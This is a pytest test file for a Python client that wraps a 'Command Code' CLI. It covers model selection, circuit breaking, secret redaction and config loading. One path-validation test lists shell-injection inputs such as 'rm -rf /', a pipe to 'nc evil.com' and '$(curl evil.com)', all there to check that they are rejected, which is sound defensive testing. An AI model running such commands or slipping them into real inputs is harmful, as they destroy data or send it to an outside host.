"""Tests cho command_code_client.py — wrap Command Code CLI."""
from __future__ import annotations

import os
import sys
from pathlib import Path
from unittest import mock

import pytest

SCRIPT_DIR = Path(__file__).resolve().parent.parent / ".devin" / "scripts"
if str(SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPT_DIR))

import command_code_client  # noqa: E402
from command_code_client import (  # noqa: E402
    CCResponse,
    chat,
    parallel_chat,
    pick_cross_model,
    reset_circuit_breaker,
)


@pytest.fixture(autouse=True)
def reset_state():
    """Reset circuit breaker + env trước mỗi test."""
    reset_circuit_breaker()
    os.environ.pop("CMDC_CURRENT_MODEL", None)
    os.environ.pop("AHD_CC_CLI_PATH", None)
    os.environ.pop("AHD_CC_TIMEOUT", None)
    yield
    reset_circuit_breaker()


def test_pick_cross_model_cheapest():
    """Strategy cheapest → haiku khi current != haiku."""
    os.environ["CMDC_CURRENT_MODEL"] = "opus"
    m = pick_cross_model(current="opus", strategy="cheapest")
    assert m == "haiku"


def test_pick_cross_model_no_current():
    """Khi current = None, pick from all available."""
    m = pick_cross_model(current=None, strategy="cheapest")
    assert m == "haiku"


def test_pick_cross_model_rotate():
    """Strategy rotate → random, may vary."""
    seen = set()
    for _ in range(20):
        m = pick_cross_model(current="sonnet", strategy="rotate")
        seen.add(m)
    # Có thể chỉ thấy 1-2 model do random, nhưng phải ≠ sonnet
    assert all(m != "sonnet" for m in seen)


def test_pick_cross_model_newest():
    """Strategy newest → opus."""
    m = pick_cross_model(current="haiku", strategy="newest")
    assert m == "opus"


def test_chat_fallback_when_cli_not_found():
    """Khi CC CLI không có → fallback response."""
    with mock.patch.object(command_code_client, "_invoke_cc") as mock_invoke:
        mock_invoke.return_value = CCResponse(
            content="x", confidence=0.5, model="sonnet", latency_ms=100,
            fallback_used=True, error="not found",
        )
        resp = chat("test prompt")
        assert resp.fallback_used is True


def test_chat_circuit_breaker():
    """5 fail liên tiếp → circuit open."""
    with mock.patch.object(command_code_client, "_invoke_cc") as mock_invoke:
        mock_invoke.return_value = CCResponse(
            content="x", confidence=0.5, model="sonnet", latency_ms=0,
            fallback_used=True, error="x",
        )
        # Trigger 5 fail
        for _ in range(5):
            chat("p")
        # Circuit should be open now
        resp = chat("p after circuit open")
        assert "circuit breaker" in resp.error.lower() or resp.fallback_used is True


def test_chat_success_resets_circuit():
    """Khi 1 call success, reset consecutive_failures."""
    with mock.patch.object(command_code_client, "_invoke_cc") as mock_invoke:
        # 3 fail
        mock_invoke.return_value = CCResponse(
            content="x", confidence=0.5, model="sonnet", latency_ms=0,
            fallback_used=True, error="x",
        )
        for _ in range(3):
            chat("p")
        # 1 success
        mock_invoke.return_value = CCResponse(
            content="ok", confidence=0.9, model="sonnet", latency_ms=100,
            fallback_used=False,
        )
        chat("p success")
        # Nếu circuit reset → counter = 0, nhưng 4 fail liên tiếp sau sẽ KHÔNG open
        # (vì success reset về 0, cần thêm 5 fail)
        for _ in range(4):
            mock_invoke.return_value = CCResponse(
                content="x", confidence=0.5, model="sonnet", latency_ms=0,
                fallback_used=True, error="x",
            )
            chat("p again")
        # Circuit vẫn chưa open (chỉ 4 fail liên tiếp)
        from command_code_client import _circuit_state
        assert _circuit_state["consecutive_failures"] < 5


# --- Phase 3 hardening: prompt redaction ---


def test_chat_redacts_secret_before_sending():
    """Khi prompt chứa AWS key → chat() redact trước khi gửi tới _invoke_cc."""
    with mock.patch.object(command_code_client, "_invoke_cc") as mock_invoke:
        mock_invoke.return_value = CCResponse(
            content="ok", confidence=0.9, model="sonnet", latency_ms=100,
            fallback_used=False,
        )
        chat("My config: AKIAIOSFODNN7EXAMPLE")
        # _invoke_cc phải nhận redacted prompt
        called_prompt = mock_invoke.call_args[0][0]
        assert "AKIAIOSFODNN7EXAMPLE" not in called_prompt
        assert "[REDACTED:aws_access_key]" in called_prompt


def test_chat_redacts_github_pat():
    with mock.patch.object(command_code_client, "_invoke_cc") as mock_invoke:
        mock_invoke.return_value = CCResponse(
            content="ok", confidence=0.9, model="sonnet", latency_ms=100,
            fallback_used=False,
        )
        chat("Token: ghp_1234567890abcdefghijklmnopqrstuvwxyz")
        called_prompt = mock_invoke.call_args[0][0]
        assert "ghp_1234567890" not in called_prompt
        assert "[REDACTED:github_pat]" in called_prompt


def test_chat_redacts_multiple_secrets():
    with mock.patch.object(command_code_client, "_invoke_cc") as mock_invoke:
        mock_invoke.return_value = CCResponse(
            content="ok", confidence=0.9, model="sonnet", latency_ms=100,
            fallback_used=False,
        )
        chat("AWS: AKIAIOSFODNN7EXAMPLE and GH: ghp_1234567890abcdefghijklmnopqrstuvwxyz")
        called_prompt = mock_invoke.call_args[0][0]
        assert "AKIA" not in called_prompt
        assert "ghp_" not in called_prompt
        assert "[REDACTED:aws_access_key]" in called_prompt
        assert "[REDACTED:github_pat]" in called_prompt


def test_chat_passes_through_when_no_secret():
    with mock.patch.object(command_code_client, "_invoke_cc") as mock_invoke:
        mock_invoke.return_value = CCResponse(
            content="ok", confidence=0.9, model="sonnet", latency_ms=100,
            fallback_used=False,
        )
        chat("Đánh giá task bình thường")
        called_prompt = mock_invoke.call_args[0][0]
        assert called_prompt == "Đánh giá task bình thường"  # không bị thay đổi


def test_chat_redact_graceful_when_secret_scanner_missing():
    """Nếu secret_scanner import fail → fallback pass original prompt."""
    with mock.patch.object(command_code_client, "_invoke_cc") as mock_invoke:
        mock_invoke.return_value = CCResponse(
            content="ok", confidence=0.9, model="sonnet", latency_ms=100,
            fallback_used=False,
        )
        with mock.patch.dict("sys.modules", {"secret_scanner": None}):
            chat("AWS: AKIAIOSFODNN7EXAMPLE")
        # Khi import fail, prompt pass nguyên (degraded mode)
        called_prompt = mock_invoke.call_args[0][0]
        # Prompt có thể chứa secret nếu import fail → degraded mode
        assert "AKIAIOSFODNN7EXAMPLE" in called_prompt or "[REDACTED" in called_prompt


def test_parallel_chat_empty():
    """Empty list → return []."""
    assert parallel_chat([]) == []


def test_parallel_chat_runs_parallel():
    """3 prompts → 3 responses."""
    with mock.patch.object(command_code_client, "chat") as mock_chat:
        mock_chat.return_value = CCResponse(
            content="ok", confidence=0.8, model="sonnet", latency_ms=100,
        )
        prompts = [("p1", "haiku"), ("p2", "sonnet"), ("p3", "opus")]
        resps = parallel_chat(prompts, max_workers=3)
        assert len(resps) == 3
        assert mock_chat.call_count == 3


def test_parallel_chat_handles_exception():
    """Nếu 1 call raise exception → fallback response, không crash."""
    with mock.patch.object(command_code_client, "chat") as mock_chat:
        mock_chat.side_effect = [Exception("boom"), CCResponse(
            content="ok", confidence=0.7, model="haiku", latency_ms=50,
        )]
        prompts = [("p1", "haiku"), ("p2", "haiku")]
        resps = parallel_chat(prompts, max_workers=2)
        assert len(resps) == 2


def test_load_config_from_env():
    """Config đọc từ env vars."""
    os.environ["AHD_CC_CLI_PATH"] = "/usr/local/bin/command-code"
    os.environ["AHD_CC_TIMEOUT"] = "120"
    cfg = command_code_client._load_config()
    assert cfg.cc_cli_path == "/usr/local/bin/command-code"
    assert cfg.timeout_seconds == 120


def test_load_config_invalid_timeout_falls_back():
    """Invalid timeout → dùng default."""
    os.environ["AHD_CC_TIMEOUT"] = "not_a_number"
    cfg = command_code_client._load_config()
    assert cfg.timeout_seconds == command_code_client.DEFAULT_TIMEOUT


# --- P0 Security: cc_cli_path allowlist validation ---


def test_validate_cc_cli_path_accepts_default():
    ok, err = command_code_client._validate_cc_cli_path("command-code")
    assert ok is True
    assert err == ""


def test_validate_cc_cli_path_accepts_unix_path():
    ok, err = command_code_client._validate_cc_cli_path("/usr/local/bin/command-code")
    assert ok is True


def test_validate_cc_cli_path_accepts_windows_path():
    ok, err = command_code_client._validate_cc_cli_path("C:\\Program Files\\cmdc\\command-code")
    assert ok is True


def test_validate_cc_cli_path_rejects_path_traversal():
    ok, err = command_code_client._validate_cc_cli_path("/path/../command-code")
    assert ok is False
    assert ".." in err


def test_validate_cc_cli_path_rejects_shell_metachars():
    for bad in ["command-code; rm -rf /", "command-code && malicious",
                 "command-code | nc evil.com", "$(curl evil.com)",
                 "command-code`whoami`", "command-code\nls"]:
        ok, err = command_code_client._validate_cc_cli_path(bad)
        assert ok is False, f"Should reject: {bad!r}"


def test_validate_cc_cli_path_rejects_empty():
    ok, err = command_code_client._validate_cc_cli_path("")
    assert ok is False
    ok, _ = command_code_client._validate_cc_cli_path(None)
    assert ok is False


def test_validate_cc_cli_path_rejects_wrong_basename():
    """Nếu basename không phải 'command-code' → reject (vd 'malicious-binary')."""
    ok, err = command_code_client._validate_cc_cli_path("/usr/bin/malicious")
    assert ok is False
    assert "command-code" in err


def test_load_config_rejects_invalid_env_path():
    """Khi AHD_CC_CLI_PATH invalid → fallback về default + log warning."""
    import sys
    os.environ["AHD_CC_CLI_PATH"] = "/path/../malicious"
    cfg = command_code_client._load_config()
    assert cfg.cc_cli_path == command_code_client.DEFAULT_CC_BIN


def test_load_config_accepts_valid_env_path():
    os.environ["AHD_CC_CLI_PATH"] = "/usr/local/bin/command-code"
    cfg = command_code_client._load_config()
    assert cfg.cc_cli_path == "/usr/local/bin/command-code"
